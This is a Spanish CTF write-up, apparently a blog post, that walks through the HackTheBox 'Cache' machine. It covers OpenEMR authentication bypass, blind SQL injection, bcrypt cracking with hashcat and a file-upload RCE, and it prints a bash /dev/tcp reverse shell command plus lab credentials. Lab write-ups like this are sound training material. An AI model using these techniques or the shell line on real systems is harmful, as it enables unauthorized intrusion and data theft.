@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Cache</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Cache | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Cache" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root." />
+<meta property="og:description" content="Máquina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root." />
+<link rel="canonical" href="http://localhost:4000/htb/cache" />
+<meta property="og:url" content="http://localhost:4000/htb/cache" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bannercache.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-14T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bannercache.png" />
+<meta property="twitter:title" content="HackTheBox - Cache" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-10-14T00:00:00-07:00","datePublished":"2020-10-14T00:00:00-07:00","description":"Máquina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root.","headline":"HackTheBox - Cache","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bannercache.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/cache"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/cache"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Cache</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-10-14">14 Oct 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bannercache.png" alt="HackTheBox - Cache">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/cacheHTB.png" alt="cacheHTB" /></p>
+
+<h3 id="alo-primero-el-tldr-spanish-writeup">Alo, primero el TL;DR (Spanish writeup)</h3>
+
+<p>Esta máquina nos presenta el uso del <code>VirtualHosting</code>, con el que nos encontraremos al servicio <code>OpenEMR</code> el cual tiene varias vulnerabilidades, nos aprovecharemos primero de un <code>bypass</code> por medio de sesiones mal configuradas, lo siguiente será una explotación <code>SQLinjection</code> para extraer data de la base de datos… Posteriormente obtendremos el usuario <code>openemr_admin</code> y su hash, crackearemos el hash y podremos logearnos en el servicio <code>openemr</code>…</p>
+
+<p>Usamos otra vulnerabilidad en la que podemos subir un archivo predeterminado pero cambiando el contenido, en el que alojaremos la posibilidad de ejecutar comandos.</p>
+
+<p>Estando dentro de la máquina extraeremos data en caché que se está guardando con la utilidad <code>memcached</code>, obtendremos la contraseña del usuario <code>luffy</code>, vemos que está asignada al grupo <code>docker</code> y usaremos eso para obtener una Shell como <code>root</code>. (así en muy, muy pocas palabras (: Disfruten)</p>
+
+<blockquote>
+  <p>Como lo he dicho en otras maquinas, me gusta enfocarme en las personas que apenas estan iniciando en este universo paralelo. Por lo tanto si vez o mucho texto o que explico de más, pues ya sabes la razón, sin más, muchas gracias y a romper todo</p>
+</blockquote>
+
+<ul>
+  <li>Además te agrego que me he creado un <a href="https://github.com/jntxJ/Writeups/blob/master/HTB/Cache/fileup2revsh.py">script en python</a> para automatizar la subida del archivo y obtención de la reverse shell, ta guapazo</li>
+</ul>
+
+<p>…</p>
+
+<p>Tendremos 3 fases como casi siempre. Enumeración, explotación y escalada de privilegios :)</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración</h2>
+
+<p>Iniciamos con un escaneo de servicios, usando <code>nmap</code> podemos validar que está corriendo cada puerto.</p>
+
+<pre><code class="language-bash">$ nmap -p- --open -T5 -Pn -v 10.10.10.188 -oG initScan
+</code></pre>
+
+<p>Pero este escaneo va algo lento, así que podemos agregarle otro parámetro y quitar él <code>-T</code></p>
+
+<pre><code class="language-bash">$ nmap -p- --open --min-rate=5000 -Pn -v 10.10.10.188 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-T5</td>
+      <td style="text-align: left">Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como resolución DNS y Ping</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable, ya veremos para que</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/initScan.png" alt="nmapInitScan" /></p>
+
+<p>Con la función que creo <a href="https://s4vitar.github.io/">s4vitar</a> podemos extraer los puertos del archivo <strong>initScan</strong> fácilmente, ya que nos los copia en la clipboard para tenerlos listos para el siguiente escaneo. Evitamos escribirlos uno a uno, en este caso se ve innecesario al ser solo 2 puertos, pero si tuviéramos muchos puertos nos sería de mucha utilidad (: hechenle un ojo. Solo deben agregarla en mi caso al <code>$ ~/.bashrc</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png" alt="extractPorts" /></p>
+
+<p>Ahora que tenemos los puertos, haremos un escaneo para validar que versión y scripts maneja en este caso el puerto <strong>HTTP</strong> y el <strong>SSH</strong>.</p>
+
+<pre><code class="language-bash">$ nmap -p22,80 -sC -sV 10.10.10.188 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/portScan.png" alt="nmapPortScan" /></p>
+
+<h3 id="veamos-la-página-web-puerto-80">Veamos la página web (puerto 80)</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageinit.png" alt="pageinit" /></p>
+
+<p>Leyendo (todo es interesante) pero con respecto al reto, vemos un <code>/login.html</code> e información en <code>/author.html</code>, primero inspeccionemos <strong>login.html</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagelogin.png" alt="pagelogin" /></p>
+
+<p>Es un simple login, pero que si hacemos pruebas, primero válida que el campo <strong>password</strong> sea igual a algo, si no, nos muestra una alerta diciendo que lo que pusimos no concuerda con “algo” y después hace lo mismo con el campo <strong>username</strong>. En este caso se me viene a la mente hacer un fuzzing a los campos (con wfuzz es fácil), ya que si le atinamos al campo <strong>password</strong> supongo que ya no nos va a mostrar ninguna alerta.</p>
+
+<p>Mirando el código fuente vemos que la petición se envía a la página <code>/net.html</code> (esto es un rabbit hole, pero igual les comentaré que hice rápidamente :P).</p>
+
+<p>Cuando queremos ingresar nos redirige a <code>/login.html</code>, pero igual podemos ver el código fuente de <code>/net.html</code> en una nueva pestaña con <strong>CTRL + U</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagenet.png" alt="pagenet" /></p>
+
+<p>Y acá vemos el redireccionamiento, pero nada más… Una imagen, que podríamos pensar en esteganografia como un método a ver si esconde algo (pero no, no hay nada, es todo una mentira e.e) Pues nada, acá me perdí completamente, no veía nada que resaltara… (díganme que también vieron algo poco usual en la imagen del <code>/login.html</code>, por que yo estuve estancado con el login por no ver eso).</p>
+
+<p>Bueno pues en la imagen nos muestra un script de <code>jquery</code> llamado <code>functionality.js</code> Y si nos dirigimos a ver el script obtenemos unas credenciales, probablemente para usar en otro sitio, debemos seguir enumerando, ya que no hay nada que nos sirva en <strong>/net.html</strong>… Intentando conectarnos con estas credenciales por el servicio <code>SSH</code> no funciona :(</p>
+
+<ul>
+  <li>username: ash</li>
+  <li>password: H@v3_fun</li>
+</ul>
+
+<p>También después de estar estancado sin saber hacia donde ver, alguien me hecho una manito diciéndome que el autor me quería decir algo. <strong>(<code>author.html</code>)</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageauthor.png" alt="pageauthor" /></p>
+
+<p>Pues mirando nos dice que tiene otro proyecto llamado <em>Hospital Management System</em> <strong>(HMS)</strong>, el cual si buscamos en internet es un software que gestiona/controla diferentes aspectos dentro de una clínica, tales como el administrativo, legal y financiero. Pues el software ya tiene <strong>exploits</strong> relacionados a <strong>SQLi</strong> y uno que hace un bypass de autenticación. Perooooo si todo está relacionado, entonces tenemos que ver que <a href="https://es.wikipedia.org/wiki/Alojamiento_compartido">vHost</a> está alojado en el servidor <strong>10.10.10.188/algoquenoslleveaHMS</strong>.</p>
+
+<p>Si miramos los exploits de HMS, siempre los relacionan así:</p>
+
+<ul>
+  <li><code>10.10.1.188/hospital/hospital/hms/cositasparomper.html</code></li>
+  <li><code>10.10.1.188/hms/cositasparomper.html</code></li>
+</ul>
+
+<p>Pero todas nos dan respuesta 404, así que debemos seguir enumerando.</p>
+
+<p>Pues estuve mucho tiempo varado, perdido, no sabía que hacer realmente, estuve revisando el foro de HTB pero las pistas me parecía haberlas hecho e intentado antes…</p>
+
+<p>Con base en lo que dice la página inicial y la página del autor haciendo alusión a <strong>cache.htb</strong>, intente modificar en el archivo <code>/etc/hosts</code>, para que cuando haga una petición en el navegador hacia <strong>cache.htb</strong> me redirija como si estuviera colocando <strong>10.10.10.188</strong>.</p>
+
+<blockquote>
+  <p>Sobre el archivo <code>hosts</code>, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.</p>
+</blockquote>
+
+<ul>
+  <li>Info sobre el archivo <a href="http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html">/etc/hosts</a></li>
+</ul>
+
+<p>Haciendo la prueba con <code>cache.htb</code> me daba el mismo output de la página inicial.</p>
+
+<pre><code class="language-bash">cat /etc/hosts
+
+  10.10.10.188  cache.htb
+</code></pre>
+
+<p>Pero indagando y leyendo, caí en cuenta que tenemos un “algo” relacionado a HMS, entonces podemos intentar que nuestra dirección IP <strong>10.10.10.188</strong> interprete su contenido con el hostname <strong>hms.htb</strong> en nuestro archivo <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">cat /etc/hosts
+
+  10.10.10.188  hms.htb
+</code></pre>
+
+<p>Ponemos en la barra del navegador <strong>hms.htb</strong> y…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagehms.png" alt="pagehms" /></p>
+
+<p>Opa, perfecto, tenemos un login y un nuevo software, <strong>openEMR</strong>. (no pude quitar el <code>Invalid username or password</code> para que quedara bien la imagen :s).</p>
+
+<blockquote>
+  <p><a href="https://es.wikipedia.org/wiki/OpenEMR">OpenEMR</a>: Es un software de administración de práctica médica qué también apoya registros médicos electrónicos.</p>
+</blockquote>
+
+<p>Pues inicialmente no hay ni credenciales por default, ni en el login logre hacer alguna SQLi o algún tipo de XSS.</p>
+
+<p>Revisando la documentación hay muchas cosas interesantes, tenemos un árbol de archivos para revisar (de los cuales podemos sacar nombres de tablas y columnas), también algunos archivos principales yyy mucho por aprender :P</p>
+
+<ul>
+  <li><a href="https://www.open-emr.org/wiki/index.php/File_Structure">Acá</a> esta la estructura que maneja el software.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemrlibrary.png" alt="pagemrlibrary" /></p>
+
+<p>Algunos de ellos nos dan info de tablas, en este caso listé solo las que tuvieran la tabla <code>users</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashfromusers.png" alt="bashfromusers" /></p>
+
+<p>De la documentación hacen referencia a un archivo <code>http://hms.htb/admin.php</code> el cual almacena el <strong>nombre de la base de datos</strong> y la <strong>versión</strong> que tiene instalada el servidor.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Site ID</th>
+      <th style="text-align: left">DB Name</th>
+      <th style="text-align: left">Site Name</th>
+      <th style="text-align: left">Version</th>
+      <th style="text-align: left">Action</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>default</td>
+      <td style="text-align: left">openemr</td>
+      <td style="text-align: left">OpenEMR</td>
+      <td style="text-align: left">5.0.1 (3)</td>
+      <td style="text-align: left">Log In</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>… Enumerando y enumerando ando, en la documentación y en la web se hace referencia a muchos archivos, algunos interesantes pero sin nada interesante :P</p>
+
+<p>Existen vaaaaaaaaaaarias vulnerabilidades en vaaaaaaaaarios archivos que maneja el servicio. Encontré un documento en el que relaciona la mayoría, es alucinante, emocionante y preocupante :D</p>
+
+<ul>
+  <li><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">Reporte de vulnerabilidades.pdf</a>.</li>
+</ul>
+
+<p>Bueno, empieza la locura :P</p>
+
+<p>En el mismo <code>.pdf</code> la mayoría de cosas hermosas a explotar las podemos hacer solo si estamos autenticados con algún usuario… Peero también tenemos algunos bypass authentication, entonces siguiendo uno de ellos (prueba y error) logramos obtener una vulnerabilidad SQLi Blind.</p>
+
+<p>Alguna info sobre SQLi Blind:</p>
+
+<ol>
+  <li><a href="https://portswigger.net/web-security/sql-injection/blind">sql-injection/blind</a>.</li>
+  <li><a href="https://medium.com/@nyomanpradipta120/blind-sql-injection-ac36d2c4daab">blind-sql-injection</a>.</li>
+  <li><a href="https://www.elladodelmal.com/2007/06/blind-sql-injection-i-de-en-mysql.html">blind-sql-injection-i-de-en-mysql</a>.</li>
+  <li><a href="https://www.youtube.com/watch?v=DpLGgFrHe3o&amp;t=1864">s4vitar</a> no puede faltar.</li>
+</ol>
+
+<p>Pues siguiendo el documento vemos que si hacemos una petición a alguna página que necesite autenticación, claramente nos debe salir un error o algo informándonos que no tenemos credenciales válidas.</p>
+
+<p>Ejemplo:</p>
+
+<ul>
+  <li>Si hacemos una petición a <code>http://hms.htb/portal</code> y desde esa página (u otra) intentamos entrar a alguna página que si o si necesite autenticación (por ejemplo a <code>/portal/find_appt_popup_user.php</code>), pues nos va a salir un error y nos redirigirá a <code>/portal</code>.</li>
+</ul>
+
+<p><strong>Pero</strong> si primero hacemos una petición a <code>http://hms.htb/portal/account/register.php</code> y posteriormente volvemos a hacer la petición a <code>/portal/find_appt_popup_user.php</code> nos dejará ver su respuesta :o</p>
+
+<p>Lo que hace la página <code>register.php</code> es que guarda 2 cookies, pero en este caso como si el usuario ya estuviera creado, pues nos aprovechamos de eso y usamos esas cookies para ingresar a alguna página que necesite autenticación.</p>
+
+<p>Como de nuestra enumeración inicial obtuvimos el nombre de la base de datos, algunas tablas y también algunos nombres de columnas. Pues podemos ahorrarnos la fase de descubrir eso e intentar sacar info de alguna tabla.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Me apoyé en el video de s4vitar para crear un exploit que me ayudara a explotar la vulnerabilidad, ya sabemos que tenemos una tabla llamada <strong>users</strong> (igual con el exploit podemos obtenerlos), será nuestro principal foco, queda dumpear la tabla a ver que data tiene.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlifromusers.png" alt="sqlifromusers" /></p>
+
+<p>Listando los usuarios de la tabla obtuve uno que me llama la atención, veamos como está guardada la password.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckuser.png" alt="sqlicheckuser" /></p>
+
+<p>Acá nos vamos fuertemente troleados :s</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckpwufail.png" alt="sqlicheckpwufail" /></p>
+
+<p>Esa password no nos funciona en ningún lado, y pues validando con los demás usuarios que vimos sale la misma password :P debemos enumerar más a ver que tablas pueden llamar la atención. Investigando y concatenando cositas logramos obtener las tablas y ordenarlas de manera descendente para tener todo lo que tenga que ver con <strong>u</strong>ser más rápido.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckorderby.png" alt="sqlicheckorderby" /></p>
+
+<p><strong>(Solo como 2 horas después de haber hecho esto, vi que en mis notas y archivos interesantes también obtuve un archivo, <code>database.sql</code>… Y si, el archivo tiene los nombres de las tablas creadas (: (: (: (: pero bueno, aprendimos a poner el DESC en una inyección SQL blind :P)</strong></p>
+
+<p>Tenemos dos que se ven interesantes, pero me inclino por la que contiene algo sobre seguridad, veamos que columnas tiene la tabla <code>users_secure</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktuserss.png" alt="sqlichecktuserss" /></p>
+
+<p>Y probemos de una con el usuario <code>openemr_admin</code> y veamos si podemos obtener la password, que lo más seguro es que esté en formato hash, ya que tenemos un campo <strong>salt</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktusspwa.png" alt="sqlichecktusspwa" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktusssalta.png" alt="sqlichecktusssalta" /></p>
+
+<pre><code class="language-py">hash = $2a$05$l2stlig6gtbeybf7takl6ttewjdmxs9bi6lxqlfcpecy6vf6p0b
+salt = $2a$05$l2stlig6gtbeybf7takl6a$
+</code></pre>
+
+<p>Pero revisando en la web tipos de hash, puede ser un <strong>bcrypt</strong> (por las iniciales, pero ningún identificador lo reconoce), solo que en la mayoría de los casos (sería muy loco donde nuestro hash no) también existen mayúsculas… Y en el que tenemos solo -tenemos- minúsculas… Jmmmmm.</p>
+
+<ul>
+  <li>Información sobre los <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashes</a>.</li>
+</ul>
+
+<p>Fue todo un reto (más que todo por que tenía un signo mal en el script que no había captado y yo como loco buscando y releyendo cosas) pero logré encontrar la manera que me trajera la info tal como está en la tabla. Ya que nuestra anterior consulta no era sensible a mayúsculas o minúsculas. Intente poner en nuestra variable <strong>dic</strong> el abecedario en mayúscula pero daba igual, si encontraba la letra la traía en minúscula.</p>
+
+<p>Logre solucionarlo pasando cada carácter a ASCII, para posteriormente compararlo con un rango de valores que trabajaban como una tabla ASCII y con ese resultado, pasar el decimal a carácter. Igual sonó complicado (o no) pero es super sencillo:</p>
+
+<ul>
+  <li>Sí el primer carácter del campo <strong>password</strong> es la <code>j</code> (aún no lo sabriamos), en ASCII sería: <strong>106</strong> (esto lo mostraria el exploit), simplemente tomando ese 106 y comparandolo con el 106 de la tabla ASCII, podemos darnos cuenta que la <code>j</code> corresponde al 106, por lo tanto que la primera letra del campo <code>password</code> es la <code>j</code>… Y asi con toda la cadena :)</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlihashpwopadmin.png" alt="sqlihashpwopadmin" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlisaltpwopadmin.png" alt="sqlisaltpwopadmin" /></p>
+
+<pre><code class="language-py">hash = $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
+salt = $2a$05$l2XTLIG6GTBeyBf7TAKL6A$
+</code></pre>
+
+<p>Claramente son muy diferentes con respecto a los otros que ya habíamos obtenido. Podemos usar de nuevo algún identificador de hashes, el cual nos confirma que es un hash bcrypt. Usaré <strong>hashcat</strong> para intentar crackearlo.</p>
+
+<pre><code class="language-bash">$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<ul>
+  <li><strong>-m</strong> : Tipo de hash a crackear</li>
+  <li><strong>-a 0</strong> : Ataque por diccionario</li>
+  <li><strong>hash.txt</strong> : Acá tenemos nuestro hash</li>
+  <li><strong>rockyou.txt</strong> : El wordlist que queremos emplear</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashashcatdone.png" alt="bashashcatdone" /></p>
+
+<p>Y listo, parece error o inusual (lo es) pero esa es la <strong>password</strong> del usuario <strong>openemr_admin</strong> para ingresar al login de <code>http://hms.htb/</code></p>
+
+<p>Listo, revisando el mismo <code>pdf</code> que contiene un increíble recuento de vulnerabilidades podemos ver varias maneras de obtener ejecución de comandos, entre ellas una que ya tiene un <a href="https://www.exploit-db.com/exploits/45161">exploit</a> para solo ejecutar el comando y ya estaríamos dentro. Pero algo me freno de usar ese script y es que al ejecutarlo modifica la configuración global y al ser una máquina que no solo nosotros usamos, probablemente la dañe y sea necesario resetear la máquina.</p>
+
+<p>Si no queremos que modifique las configuraciones globales debemos cambiar el payload, pero no entendí que debía cambiar… Así que opte por buscar otra vulnerabilidad (tenemos varias) que podamos usar.</p>
+
+<p>Encontramos un <strong>file upload vulnerability</strong> que podemos usar para montar un archivo y modificar su contenido para ejecutar comandos en el sistema.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagefileupvuln.png" alt="pagefileupvuln" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemanagesitefiles.png" alt="pagemanagesitefiles" /></p>
+
+<p>Nos indica que va a guardar los archivos en <code>/public_html/sites/default/</code>, pero si validamos, esa ruta no existe. Buscando por internet encontramos un PoC que explota esta vulnerabilidad y también nos indica la ruta donde se guardarán los archivos, <strong><code>/sites/default/</code></strong>.</p>
+
+<ul>
+  <li><a href="https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary">Remote Code Execution OpenEMR</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageindexsitesdef.png" alt="pageindexofsitesdef" /></p>
+
+<p>Si seguimos el PoC, interceptamos la petición y modificamos su contenido, logramos subir el archivo… Intente cambiarle el nombre pero al parecer solo recibe <strong>custom_pdf.php</strong>, si revisamos de nuevo la página vemos en el apartado <strong>Edit File</strong>, que entre esos esta por default el archivo que queremos subir, así que debe hacer una validación en la que simplemente se puedan editar los archivos de esa lista. (no logre tomar screen a la lista, pero al menos vemos que sin haber subido aún el archivo (queda en ti creerme :P) aparece por default).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemanagesitespdf.png" alt="pagemanagesitepdf" /></p>
+
+<p>Bueno, mucho texto y nada que explotamos esto e.e.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/burpuploadfile.png" alt="burpuploadfile" /></p>
+
+<p>En el contenido simplemente recibimos una petición get y lo que sea, será ejecutado en el sistema. Mandemos una Reverse Shell a ver… Ya saben, es necesario que pasemos a URL encode nuestra petición, ya que probablemente el navegador no haga nada si le pasamos por ejemplo:</p>
+
+<pre><code class="language-php">xmd=?bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.21/4433 0&gt;&amp;1'
+</code></pre>
+
+<p>No hará nada, pensaremos que está mal y no, solo debemos pasarla a URL encode y quedaría como en la imagen (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashcurlrevshell.png" alt="bashcurlrevshell" /></p>
+
+<p>La Shell que tenemos no es completamente interactiva, por lo tanto debemos darle un tratamiento a la tty, algunos links donde se explica.</p>
+
+<ul>
+  <li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Convertir a una shell completamente interactiva</a></li>
+  <li><a href="https://www.youtube.com/watch?v=amKkzk-yP14&amp;t=953">Resumido y facil (Gracias s4vitar)</a></li>
+</ul>
+
+<p>Ahora que estamos en la máquina procedemos a enumerar usuarios.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshusers.png" alt="revshusers" /></p>
+
+<p>Tenemos al usuario <code>ash</code> y <code>luffy</code>, si recuerdan al inicio de nuestra enumeración obtuvimos unas credenciales de <strong>ash</strong> su contraseña era <strong>H@v3_fun</strong>, validemos si nos permite ingresar.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshellash.png" alt="revshellashh" /></p>
+
+<p>Enumerando el archivo <code>$ /etc/passwd</code> vemos 2 programas interesantes, <strong>mysql</strong> y <strong>memcached</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshetcpasswd.png" alt="revshetcpasswd" /></p>
+
